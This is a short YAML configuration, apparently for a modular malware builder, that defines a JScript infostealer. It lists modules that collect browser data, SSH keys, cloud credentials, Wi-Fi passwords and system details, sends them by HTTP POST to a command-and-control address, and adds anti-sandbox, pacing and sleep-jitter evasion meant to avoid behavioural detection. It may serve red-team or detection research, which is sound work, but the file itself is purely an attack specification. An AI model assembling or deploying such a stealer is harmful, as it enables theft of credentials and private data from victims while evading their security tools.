name: js_infostealer_paced
description: Paced JScript infostealer with random delays between collectors to avoid behavioral detection
format: jscript

core:
  - core/emit_buffer
  - core/run_cmd
  - core/file_ops

collectors:
  - collectors/sysinfo
  - collectors/processes
  - collectors/network
  - collectors/security_products
  - collectors/browser_chromium
  - collectors/ssh_keys
  - collectors/cloud_creds
  - collectors/wifi_passwords
  - collectors/recent_files

exfil: exfil/http_post
arch: arch/paced

evasion:
  - evasion/anti_sandbox
  - evasion/behavioral_pacing
  - evasion/sleep_jitter

vars:
  C2_IP: "10.0.2.2"
  C2_PORT: "9001"
  PACE_DELAY: "15000"
